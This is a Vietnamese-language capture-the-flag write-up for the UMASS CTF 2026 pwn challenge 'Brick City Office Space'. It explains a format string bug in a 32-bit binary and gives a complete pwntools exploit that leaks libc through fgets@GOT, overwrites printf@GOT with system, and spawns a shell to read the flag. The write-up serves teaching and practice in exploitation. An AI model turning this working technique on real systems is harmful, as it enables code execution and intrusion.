---
title: "Brick City Office Space - UMASS CTF 2026"
date: 2026-04-15
categories: [CTF, Tournament]
tags: [UMASS, pwn]
description: "No Description"
---

## Challenge Description
Help design the office space for Brick City's new skyscraper! read flag.txt for design specifications
> nc brick-city-office-space.pwn.ctf.umasscybersec.org 32769

## Nhận diện String Format Vuln
Trước hết từ binary đề cung cấp, thực hiện nhận diện file:
```bash
$ file BrickCityOfficeSpace
BrickCityOfficeSpace: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=bbba1b5cfa9ca1c5c04034cdc25f2c9f610d0036, for GNU/Linux 3.2.0, not stripped

$ checksec --file=BrickCityOfficeSpace
[*] '/mnt/d/UIT/CTF-Training/wargame/brickCity/BrickCityOfficeSpace'
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

**Nhận xét**: Đây là một ELF-32 bit binary với address trong file là cố định (No PIE) và GOT có thể overwrite (No RELRO).

Tiếp theo thực hiện decompile với IDA Pro, ta phát hiện trong `main()` có gọi hàm `vuln()`. Do đó lỗ hổng cần khai thác nhiều khả năng sẽ nằm trong hàm này:

![call_vuln](https://www.notion.so/image/attachment%3A576c0a70-e40c-4609-ac17-6985e43b7be5%3Aimage.png?table=block&id=3421b638-5371-8083-a9d6-e8bb20f193c0&spaceId=a781b638-5371-818f-8f7e-000357107d6a&width=1420&userId=&cache=v2)

Do address đối với binary này là cố định, nên có thể xác định được address cụ thể của các hàm quan trọng để khai thác bao gồm:
- `main()`: `0x080493DB`
- `vuln()`: `0x080491D6`
- `puts@got`: `0x0804BBBC`
- `printf@got`: `0x0804BBB0`

Kiểm tra thư viện binary này sử dụng (`libc.so.6`) để lấy address của `system` và `puts`:
- `system`: `0x00048170`
- `puts`: `0x000732A0`

Thực hiện kiểm tra `vuln()`, nhận diện được lỗ hổng trong binary này là **Format String** khi user input được truyền thẳng đến hàm `printf()`. Cụ thể, có 2 lần lệnh `printf` được gọi để nhận trực tiếp buffer input:
- Sau khi read ASCII ở prompt chính:

    ![Pseu](https://www.notion.so/image/attachment%3Aea5696b6-f6dc-4282-9004-e42846e8efcc%3Aimage.png?table=block&id=3421b638-5371-8046-8ec1-fc53cd993960&spaceId=a781b638-5371-818f-8f7e-000357107d6a&width=1420&userId=&cache=v2)

    ![asm](https://www.notion.so/image/attachment%3A644ce281-99a7-4652-b0bc-07ae7dd0c382%3Aimage.png?table=block&id=3421b638-5371-803f-a585-e65f488af443&spaceId=a781b638-5371-818f-8f7e-000357107d6a&width=1420&userId=&cache=v2)

- Ở branch nhập sai y/n - `This is what you said:`:

    ![Pseu](https://www.notion.so/image/attachment%3A3e4069b4-e325-4a9d-bd60-5d794ac88c48%3Aimage.png?table=block&id=3421b638-5371-8029-8759-fb8183e3e288&spaceId=a781b638-5371-818f-8f7e-000357107d6a&width=1420&userId=&cache=v2)

    ![asm](https://www.notion.so/image/attachment%3A72d508b5-b5e3-4985-910c-ecd651f2ee32%3Aimage.png?table=block&id=3421b638-5371-80af-b5e0-e153ed34ee4c&spaceId=a781b638-5371-818f-8f7e-000357107d6a&width=1420&userId=&cache=v2)

Vì binary **No RELRO**, có vòng lặp, và có nhiều lần gọi `printf` nên phương án khai thác tiềm năng nhất là leak libc từ GOT + overwrite GOT.

## Exploit
Do tồn tại đến 2 lần gọi `printf` nên trong một giai đoạn thực thi chương trình sẽ tạo ra 2 giai đoạn riêng biệt: Đầu tiên sử dụng 1 prompt để leak libc, sau đó lặp lại một lần nữa để kích hoạt **hijacked printf**. Vì `printf@got` có thể ghi và chương trình sau đó gọi `printf` trên đầu vào do attacker kiểm soát một lần nữa, việc thay thế `printf@got` bằng `system` sẽ biến một `printf(buffer)` sau đó thành `system(buffer)`.

Từ đó ta có exploit process như sau:
### 1. Leak libc

Ở prompt đầu tiên, thực hiện gửi như sau:
```python
    target_got = elf.got["fgets"]
    payload = p32(target_got) + f"START%{fmt_offset}$.4sEND".encode()

    # p32(target_got) → đưa địa chỉ cần leak lên stack
    # %{fmt_offset}$.4s → đọc 4 byte tại địa chỉ đó
    # "START ... END" → giúp parse output
```

**Giải thích**: 
- 4 byte đầu payload là địa chỉ `fgets@GOT`
- `%{fmt_offset}$.4s` dereference đối số thứ fmt_offset như con trỏ
- `printf` đọc dữ liệu tại `fgets@GOT`
- Các byte leak ra là địa chỉ runtime của `fgets` trong libc

**Stack Layout**:
```
          STACK
---------------------------------
| ...                           |
| target_got (fgets@GOT)       | <-- fmt_offset
| "START%...END"               |
---------------------------------

          ↓ printf đọc

fmt_offset → lấy target_got
           → dereference
           → đọc fgets@GOT

          ↓

OUTPUT:
START + fgets_addr + END
```

Sau khi leak được runtome address trong libc, thực hiện tính được libc_base address theo công thức sau:
```python
libc_base = fgets_addr - offset_fgets
```

Từ libc_base, thực hiện tính được `system` address theo công thức:
```python
system = libc_base + offset_system
```

### 2. GOT Overwrite

Thực hiện tạo format payload với `fmtstr_payload` ghi:
```python
printf@GOT = system
```

Cụ thể:
```python
# Tạo dictionary chứa các địa chỉ cần ghi:
# key   = địa chỉ GOT của printf
# value = địa chỉ hàm system (đã tính từ libc base)
# → mục tiêu: ghi đè printf@GOT → system
writes = {elf.got["printf"]: system_addr}

# Tạo payload format string để thực hiện ghi
# offset      = vị trí của input trên stack (fmt_offset)
# writes      = các cặp (addr → value) cần ghi
# write_size  = "short" → ghi từng 2 byte (tránh lỗi và dễ kiểm soát hơn)
# → payload này sẽ dùng %hn để ghi đè từng phần của địa chỉ system vào GOT
payload = fmtstr_payload(offset, writes, write_size="short")

# Gửi payload tới chương trình để thực thi exploit
io.sendline(payload)
```

### 3. Trigger System

Các bước cụ thể:
- Chương trình in prompt `Would you like to redesign? (y/n)` rồi đọc lại input.
- Nếu gửi chuỗi không phải y/n (ví dụ `/bin/sh`), binary đi vào nhánh lỗi có `printf(user_input)`.
- Lúc này vì đã hijack GOT: `printf("/bin/sh")` trở thành `system("/bin/sh")`.
- Gửi `cat flag.txt` để lấy flag.

Từ các bước trên, ta có source exploit cụ thể như sau:
```python
#!/usr/bin/env python3
from pathlib import Path
import re
import time

from pwn import ELF, context, fmtstr_payload, p32, process, remote, u32


context.arch = "i386"
context.log_level = "info"

BASE_DIR = Path(__file__).resolve().parents[2]
BIN_PATH = BASE_DIR / "BrickCityOfficeSpace"
LIBC_PATH = BASE_DIR / "libc.so.6"
LD_PATH = BASE_DIR / "ld-linux.so.2"


def start_target(mode: str = "local", host: str = "", port: int = 0):
    if mode == "remote":
        return remote(host, port)
    argv = [str(LD_PATH), "--library-path", str(BASE_DIR), str(BIN_PATH)]
    return process(argv, cwd=str(BASE_DIR))


def discover_fmt_offset(mode: str = "local", host: str = "", port: int = 0, max_idx: int = 100) -> int:
    marker = b"AAAABBBB"
    for idx in range(1, max_idx + 1):
        io = start_target(mode=mode, host=host, port=port)
        io.recvuntil(b"BrickCityOfficeSpace> ")

        payload = marker + f".%{idx}$p".encode()
        io.sendline(payload)
        out = io.recvall(timeout=1).decode("latin-1", errors="ignore")

        m = re.search(r"AAAABBBB\.(0x[0-9a-fA-F]+)", out)
        if not m:
            continue
        val = m.group(1).lower()
        if val in {"0x41414141", "0x42424242", "0x4242424241414141"}:
            return idx

    raise RuntimeError("Format offset not found")


def leak_libc_fgets(io, elf: ELF, fmt_offset: int) -> int:
    target_got = elf.got["fgets"]
    payload = p32(target_got) + f"START%{fmt_offset}$.4sEND".encode()

    io.recvuntil(b"BrickCityOfficeSpace> ")
    io.sendline(payload)
    chunk = io.recvuntil(b"Would you like to redesign? (y/n)")
    io.sendline(b"y")

    m = re.search(rb"START(.{1,4})END", chunk, re.DOTALL)
    if not m:
        raise RuntimeError("Cannot extract libc leak")
    leaked = m.group(1)
    return u32(leaked.ljust(4, b"\x00"))


def run_exploit(mode: str = "local", host: str = "", port: int = 0, known_offset: int | None = 4) -> str:
    elf = ELF(str(BIN_PATH))
    libc = ELF(str(LIBC_PATH))
    offset = known_offset if known_offset is not None else discover_fmt_offset(mode=mode, host=host, port=port)

    io = start_target(mode=mode, host=host, port=port)

    leaked_fgets = leak_libc_fgets(io, elf, offset)
    libc.address = leaked_fgets - libc.symbols["fgets"]
    system_addr = libc.symbols["system"]

    io.recvuntil(b"BrickCityOfficeSpace> ")
    writes = {elf.got["printf"]: system_addr}
    payload = fmtstr_payload(offset, writes, write_size="short")
    io.sendline(payload)

    io.recvuntil(b"Would you like to redesign? (y/n)")
    io.sendline(b"/bin/sh")

    io.sendline(b"cat flag.txt")
    io.sendline(b"exit")

    data = io.recvall(timeout=2).decode("latin-1", errors="ignore")
    return f"mode={mode} offset={offset} leaked_fgets={hex(leaked_fgets)} libc_base={hex(libc.address)} system={hex(system_addr)}\n{data}"


def run_with_retries(mode: str = "local", host: str = "", port: int = 0, retries: int = 5, known_offset: int | None = 4) -> str:
    last_error = ""
    for attempt in range(1, retries + 1):
        try:
            return run_exploit(mode=mode, host=host, port=port, known_offset=known_offset)
        except Exception as exc:  # noqa: BLE001
            last_error = f"attempt {attempt}/{retries} failed: {exc}"
            time.sleep(0.2)
    raise RuntimeError(last_error)


if __name__ == "__main__":
    output = run_with_retries()
    print(output)
```

Thực hiện remote connection để attack và lấy flag:
```python
import argparse

from exploit import run_with_retries


def main():
    parser = argparse.ArgumentParser(description="Brick City Office Space solver")
    parser.add_argument("--mode", choices=["local", "remote"], default="local")
    parser.add_argument("--host", default="")
    parser.add_argument("--port", type=int, default=0)
    parser.add_argument("--retries", type=int, default=5)
    parser.add_argument("--offset", type=int, default=4)
    parser.add_argument("--auto-offset", action="store_true", help="Auto-discover format offset")
    args = parser.parse_args()

    known_offset = None if args.auto_offset else args.offset
    print(
        run_with_retries(
            mode=args.mode,
            host=args.host,
            port=args.port,
            retries=args.retries,
            known_offset=known_offset,
        )
    )


if __name__ == "__main__":
    main()
```

Kết quả:
```bash
mode=remote offset=4 leaked_fgets=0xf7d8b6c0 libc_base=0xf7d1a000 system=0xf7d62170

Well that wasn't a y or an n... clearly you don't know how to follow simple instructions. Maybe we should reconsider your employment.

This is what you said:

UMASS{th3-f0rm4t_15-0ff-th3-ch4rt5}

--- Session ending - you've bricked your last block ---
```

## Conclusion

- Bài này là format string 32-bit điển hình với điều kiện khai thác rất thuận lợi: **No RELRO + No PIE**.
- Điểm mấu chốt:
  1. Xác định đúng sink `printf(user_input)` trong asm.
  2. Leak libc ổn định qua `fgets@GOT`.
  3. Ghi đè `printf@GOT -> system` bằng `%hn`.
  4. Kích hoạt nhánh nhập sai để gọi `system("/bin/sh")` rồi đọc flag.
- Kiến thức rút ra:
  - Khi có vòng lặp nhập liệu, format string thường cho phép làm multi-stage exploit rất sạch.
  - Với no RELRO, GOT overwrite thường là lựa chọn ưu tiên trước ROP.
- Cách solve khác có thể cân nhắc:
  - Leak địa chỉ hàm khác trong libc (`puts`, `__libc_start_main`) rồi tính base tương tự.
  - Nếu muốn stealth hơn, thay `printf@GOT` bằng hàm khác được gọi ở luồng phù hợp tùy control flow.